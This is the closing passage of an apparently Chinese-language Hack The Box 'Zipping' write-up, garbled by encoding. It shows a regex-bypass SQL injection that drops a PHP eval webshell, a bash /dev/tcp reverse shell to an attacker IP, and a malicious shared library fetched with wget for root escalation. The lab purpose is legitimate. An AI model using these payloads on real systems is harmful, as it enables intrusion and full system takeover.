class="string">&quot;&lt;p&gt;File size must be less than 300,000 bytes.&lt;/p&gt;&quot;</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Create an md5 hash of the zip file</span></span><br><span class="line">                <span class="variable">$fileHash</span> = <span class="title function_ invoke__">md5_file</span>(<span class="variable">$zipFile</span>);</span><br><span class="line">                <span class="comment">// Create a new directory for the extracted files</span></span><br><span class="line">                <span class="variable">$uploadDir</span> = <span class="string">&quot;uploads/<span class="subst">$fileHash</span>/&quot;</span>;</span><br><span class="line">		<span class="variable">$tmpDir</span> = <span class="title function_ invoke__">sys_get_temp_dir</span>();</span><br><span class="line">                <span class="comment">// Extract the files from the zip</span></span><br><span class="line">                <span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$zipFile</span>) === <span class="literal">true</span>) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">count</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Please include a single PDF file in the archive.&lt;p&gt;&#x27;</span>;</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="comment">// Get the name of the compressed file</span></span><br><span class="line">                  <span class="variable">$fileName</span> = <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">getNameIndex</span>(<span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> (<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileName</span>, PATHINFO_EXTENSION) === <span class="string">&quot;pdf&quot;</span>) &#123;</span><br><span class="line">                    <span class="variable">$uploadPath</span> = <span class="variable">$tmpDir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$uploadDir</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;7z e &#x27;</span>.<span class="variable">$zipFile</span>. <span class="string">&#x27; -o&#x27;</span> .<span class="variable">$uploadPath</span>. <span class="string">&#x27;&gt;/dev/null&#x27;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$uploadPath</span>.<span class="variable">$fileName</span>)) &#123;</span><br><span class="line">                      <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>);</span><br><span class="line">                      <span class="title function_ invoke__">rename</span>(<span class="variable">$uploadPath</span>.<span class="variable">$fileName</span>, <span class="variable">$uploadDir</span>.<span class="variable">$fileName</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:&lt;/p&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$uploadDir</span>.<span class="variable">$fileName</span>.<span class="string">&#x27;&quot;&gt;&#x27;</span>.<span class="variable">$uploadDir</span>.<span class="variable">$fileName</span>.<span class="string">&#x27;&lt;/a&gt;&#x27;</span>.<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;The unzipped file must have  a .pdf extension.&lt;/p&gt;&quot;</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&quot;Error uploading file.&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="ä»£ç å®¡è®¡-sql"><a href="#ä»£ç å®¡è®¡-sql" class="headerlink" title="ä»£ç å®¡è®¡+sql"></a>ä»£ç å®¡è®¡+sql</h3><p>å››ä¸ªæ–‡ä»¶åŸºæœ¬å­˜åœ¨æ¼æ´ç‚¹çš„åœ°æ–¹å°±æ˜¯åœ¨<code>cart.php</code>çš„sqlæŸ¥è¯¢ä¸­</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+&#123;&#125;\[\]\\|;:&#x27;\&quot;,.&lt;&gt;\/?]|[^0-9]$/&quot;</span>, <span class="variable">$product_id</span>, <span class="variable">$match</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+&#123;&#125;[\]\\|;:&#x27;\&quot;,.&lt;&gt;\/?]/i&quot;</span>, <span class="variable">$quantity</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Construct the SQL statement with a vulnerable parameter</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM products WHERE id = &#x27;&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;product_id&#x27;</span>] . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="comment">// Execute the SQL statement without any sanitization or parameter binding</span></span><br><span class="line">        <span class="variable">$product</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>)-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br></pre></td></tr></table></figure>

<p>è¦æƒ³åŠæ³•ç»•è¿‡<code>&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+&#123;&#125;\[\]\\|;:&#39;\&quot;,.&lt;&gt;\/?]|[^0-9]$/&quot;</code>;è¿™ä¸ªæ­£åˆ™åŒ¹é…å°±æ˜¯ï¼šå¦‚æœä½ æ˜¯ä»¥<code>A-Za-z!#$%^&amp;*()\-_=+&#123;&#125;\[\]\\|;:&#39;\&quot;,.&lt;&gt;\/?</code>è¿™å…¶ä¸­çš„å­—ç¬¦å¼€å¤´æˆ–è€…ä»¥ä¸€ä¸ªéæ•°å­—ç»“å°¾çš„è¯å°±ä¼šåŒ¹é…æˆåŠŸ</p>
<ul>
<li>^ï¼šåŒ¹é…è¾“å…¥çš„å¼€å§‹ä½ç½®ã€‚</li>
<li>.*ï¼šåŒ¹é…ä»»æ„å­—ç¬¦ï¼ˆé™¤æ¢è¡Œç¬¦ä¹‹å¤–ï¼‰é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚</li>
<li>[A-Za-z!#$%^&amp;*()-_&#x3D;+{}[]\|;:â€™â€,.&lt;&gt;/?]ï¼šåŒ¹é…ä»»æ„ä¸€ä¸ªå­—æ¯æˆ–ç‰¹æ®Šå­—ç¬¦ã€‚</li>
<li>|ï¼šè¡¨ç¤ºæˆ–è€…çš„æ„æ€ã€‚</li>
<li>[^0-9]ï¼šåŒ¹é…é™¤æ•°å­—ä¹‹å¤–çš„ä»»æ„å­—ç¬¦ã€‚</li>
<li>$ï¼šåŒ¹é…è¾“å…¥çš„ç»“æŸä½ç½®ã€‚</li>
</ul>
<p>æˆ‘ä»¬è¿™é‡Œå°±æ˜¯åˆ©ç”¨äº†<code>.*</code>ä¸åŒ¹é…<code>\n</code>çš„ç‰¹æ€§æ¥ç»•è¿‡æ­£åˆ™åŒ¹é…çš„</p>
<p>å¹¶ä¸”<code>$pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC);</code>å­˜åœ¨å †å æ³¨å…¥</p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>ç°åœ¨æ€è·¯æ¯”è¾ƒæ¸…æ¥šäº†ï¼Œåˆ©ç”¨sqlæ³¨å…¥ <code>into outfile</code>ä¸Šä¼ æœ¨é©¬ï¼Œå†æ–‡ä»¶åŒ…å«æœ¨é©¬ï¼›ä¸ºä»€ä¹ˆè¦åŒ…å«ï¼Ÿç›´æ¥æŠŠğŸæ”¾åœ¨<code>/var/www/html/</code>ä¸‹ï¼Œåœ¨è®¿é—®ä¸å°±å¯ä»¥äº†å—ï¼Ÿç¡®å®ï¼Œæƒ³çš„å¾ˆç¾å¥½ï¼›ä½†æ˜¯åœ¨ä¸Šé©¬çš„è¿‡ç¨‹ä¸­ä¼šå‘ç°<code>/var/www/html/</code>ä¸€ç›´ä¸æˆåŠŸï¼ŒçŒœæµ‹æ˜¯æ²¡æœ‰æƒé™ï¼Œåªèƒ½å°†ğŸæ”¾åœ¨å…¶ä»–æœ‰æƒé™çš„åœ°æ–¹ï¼Œå†åŒ…å«åˆ©ç”¨ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0a&#x27;; select &#x27;&lt;?php phpinfo();eval($_REQUEST[1]);?&gt;&#x27; into outfile &#x27;/var/lib/mysql/shell.php&#x27;; --1</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/shop/index.php?page=cart</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.10.11.229</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>163</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://10.10.11.229</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://10.10.11.229/shop/index.php?page=product&amp;id=1</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=7c043nqbhm56rmfbgitd4vestc</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">quantity</span>=<span class="number">1</span>&amp;product_id=%<span class="number">0</span>a&#x27;%<span class="number">3</span>B%<span class="number">20</span>select%<span class="number">20</span>&#x27;%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>phpinfo()%<span class="number">3</span>Beval(%<span class="number">24</span>_REQUEST%<span class="number">5</span>B1%<span class="number">5</span>D)%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E&#x27;%<span class="number">20</span>into%<span class="number">20</span>outfile%<span class="number">20</span>&#x27;%<span class="number">2</span>Fvar%<span class="number">2</span>Flib%<span class="number">2</span>Fmysql%<span class="number">2</span>Fshell.php&#x27;%<span class="number">3</span>B%<span class="number">20</span>--<span class="number">1</span></span></span><br></pre></td></tr></table></figure>

<p>å†åå¼¹webshell,æˆåŠŸæ‹¿åˆ°<code>rektsu</code>ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;/bin/bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.13/5555 0&gt;&amp;1&#x27;&quot;</span><br><span class="line">%22%2Fbin%2Fbash%20-c%20&#x27;%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F5555%200%3E%261&#x27;%22</span><br><span class="line"></span><br><span class="line">POST:1=system(%22%2Fbin%2Fbash%20-c%20&#x27;%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F5555%200%3E%261&#x27;%22);</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸæ‹¿åˆ°shellï¼Œæˆ‘ä»¬å†ä¼šè¿‡å»çœ‹ä¸€ä¸‹ä¹‹å‰æ²¡æœ‰ä¸Šä¼ æˆåŠŸæ˜¯ä¸æ˜¯æ²¡æœ‰æƒé™å¯¼è‡´çš„ï¼›</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rektsu@zipping:/var/www$ <span class="built_in">ls</span> -l /var/www</span><br><span class="line">drwxr-xr-x 5 root rektsu 4096 Sep  5 14:25 html</span><br><span class="line"></span><br><span class="line">rektsu@zipping:/var/www$ <span class="built_in">ls</span> /var/www/html -l</span><br><span class="line">drwxrwxr-x 3 root rektsu  4096 Dec 13 02:46 shop</span><br><span class="line"></span><br><span class="line">rektsu@zipping:/var/www$ <span class="built_in">ls</span> -l /var/lib</span><br><span class="line">drwxr-xr-x  6 mysql mysql 4096 Dec 13 02:51 mysql</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰å°±æœ‰ç‚¹æ‡µé€¼äº†ï¼Œä¸ºä»€ä¹ˆ<code>/var/www/html/shop</code>æœ‰æƒé™å´æ²¡æœ‰ä¸Šä¼ æˆåŠŸ;<code>/var/lib/mysql</code>å´æˆåŠŸäº†ï¼Œå¥‡æ€ªï¼›</p>
<h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p><code>sudo -l</code>å‘ç°å¯ä»¥è¿è¡Œä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶<code>/usr/bin/stock</code>ï¼›</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rektsu@zipping:/var/www$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for rektsu on zipping:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User rektsu may run the following commands on zipping:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/stock</span><br></pre></td></tr></table></figure>

<p>å°†<code>/usr/bin/stock</code>æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°<code>gdb</code>è°ƒè¯•ï¼›</p>
<p>è¿™é‡Œè¦æˆ‘ä»¬è¾“å…¥å¯†ç ï¼Œæˆ‘ä»¬ä¸çŸ¥é“ï¼Œå…ˆè¾“å…¥åƒåœ¾å­—ç¬¦</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/image-20231213112547617.png"></p>
<p>è¿™ä¸ªå­˜åœ¨ä¸€ä¸ª<code>checkAuth</code>,åº”è¯¥æ˜¯éªŒè¯å¯†ç çš„å‡½æ•°ï¼ŒæŒ‰<code>s</code>è·Ÿè¿›çœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°å†å¹²å˜›</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/image-20231213112620587.png"></p>
<p>å¯ä»¥çœ‹åˆ°å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸<code>St0ckM4nager</code>ä½œæ¯”è¾ƒï¼›è¯´æ˜<code>St0ckM4nager</code>å°±æ˜¯password</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/image-20231213112652991.png"></p>
<p>ç¬¬äºŒæ¬¡è°ƒè¯•ï¼šè¾“å…¥æ­£ç¡®çš„å¯†ç ï¼Œçœ‹çœ‹ä¸‹é¢ä¼šæ‰§è¡Œä»€ä¹ˆ</p>
<p>è¿™é‡Œè°ƒç”¨äº†<code>dlopen</code>å‡½æ•°æ»¨å´æ–‡ä»¶åæ˜¯<code>/home/rektsu/.config/libcounter.so</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/image-20231213113252897.png"></p>
<p>åœ¨Cè¯­è¨€ä¸­ï¼Œ<code>dlopen</code>å‡½æ•°ç”¨äºåŠ¨æ€åŠ è½½å…±äº«åº“ï¼ˆä¹Ÿç§°ä¸ºåŠ¨æ€é“¾æ¥åº“ï¼‰å¹¶è¿”å›ä¸€ä¸ªå¥æŸ„ï¼Œä»¥ä¾¿åœ¨è¿è¡Œæ—¶ä½¿ç”¨åº“ä¸­çš„å‡½æ•°å’Œç¬¦å·ã€‚</p>
<p>ä¸€ä¸‹å°±æƒ³åˆ°<code>LD-PRELOAD</code>åŠ«æŒ<code>so</code>æ–‡ä»¶åˆ°è¾¾ææƒçš„ç›®çš„ã€‚<code>ls -l /home/rektsu/.config/libcounter.so </code>å¹¶æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ã€‚éœ€è¦æˆ‘ä»¬å†æœ¬åœ°åˆ¶ä½œæ¶æ„çš„åŠ¨æ€é“¾æ¥åº“ï¼›</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init() &#123; </span><br><span class="line">        system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆæ¶æ„åŠ¨æ€é“¾æ¥åº“ï¼š<code>gcc hack.c -fPIC -shared -o libcounter.so -nostartfiles</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget 10.10.16.13:8000/libcounter.so</span><br><span class="line"></span><br><span class="line">sudo /usr/bin/stock</span><br><span class="line">St0ckM4nager</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure>



<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p><code>nmap</code>æœé›†åˆ°<code>80</code>ç«¯å£å¼€æ”¾ï¼›dirsearchæœé›†<code>/upload.php</code>,<code>/shop</code>;å…¶ä¸­<code>/shop/index?page=</code>å­˜åœ¨åŒ…å«ä»»æ„phpæ–‡ä»¶æ¼æ´ï¼›<code>/upload.php</code>å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯»å–åˆ°<code>/var/www/html/shop/cart.php</code>å‘ç°å­˜åœ¨<code>sqlæ³¨å…¥</code>ï¼›å¯ä»¥åˆ©ç”¨<code>into outfile</code>æ³¨å…¥ğŸï¼›å†åˆ©ç”¨æ–‡ä»¶åŒ…å«ğŸï¼›åå¼¹shellå¾—åˆ°<code>rektsu</code>ç”¨æˆ·ï¼›<code>sudo -l</code>å‘ç°sudoè¿è¡Œ<code>/usr/bin/stock</code>æ–‡ä»¶ï¼Œä¸‹è½½åˆ°æœ¬åœ°è°ƒè¯•ï¼Œå‘ç°<code>stock</code>åŠ è½½äº†åŠ¨æ€é“¾æ¥åº“<code>/home/rektsu/.config/libcounter.so</code>;åŠ«æŒåŠ¨æ€é“¾æ¥åº“æ¥ææƒã€‚</p>
</p></div><div class="post-footer"><div class="tip">All rights reserved<br>Author: zIxyd</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-13</span><i class="fa fa-tag"></i><a class="tag" href="/tags/HTB/" title="HTB">HTB </a><span class="leancloud_visitors"></span><span>About 2813 words, 9 min 22 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=I%20have%20found%20a%20great%20blog.%0A%0AzIxyd's%20Blog%20%C2%B7%20Zipping(HTB)%0Ahttps://zIxyd.github.io/2023/12/13/Zipping(HTB)/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2023/12/11/CozyHosting(HTB)/" title="CozyHosting(HTB)">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/darkLightToggle.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>